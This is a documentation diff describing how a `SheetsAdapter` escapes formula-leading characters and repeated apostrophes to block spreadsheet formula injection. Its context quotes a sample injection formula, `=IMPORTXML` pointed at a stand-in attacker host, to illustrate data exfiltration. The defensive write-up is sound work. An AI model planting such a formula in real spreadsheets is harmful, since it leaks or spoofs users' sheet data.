@@ -16,10 +16,12 @@ stored string such as `=IMPORTXML("http://evil.example/","//x")` would run as a
 live formula and could exfiltrate or spoof sheet data.
 
 `SheetsAdapter` therefore escapes every string value whose first character can
-open a formula — `=`, `+`, `-`, `@`, tab, carriage return, and the `'`
-plain-text prefix itself — by writing it behind Sheets' plain-text prefix. The
-cell holds literal text, and reads return the original string unchanged, so the
-protection is invisible to application code.
+open a formula — `=`, `+`, `-`, `@`, tab, carriage return — by writing it
+behind Sheets' plain-text prefix (`'`). A value that already starts with k
+apostrophes is written behind 2k+1 of them, so it reads back unchanged whether
+Sheets drops one apostrophe while parsing the write or keeps the text verbatim.
+The cell holds literal text, and reads return the original string unchanged, so
+the protection is invisible to application code.
 
 Values authored by your own script can opt out per adapter with
 `allowFormulas: true`, which writes strings verbatim and lets formulas run.
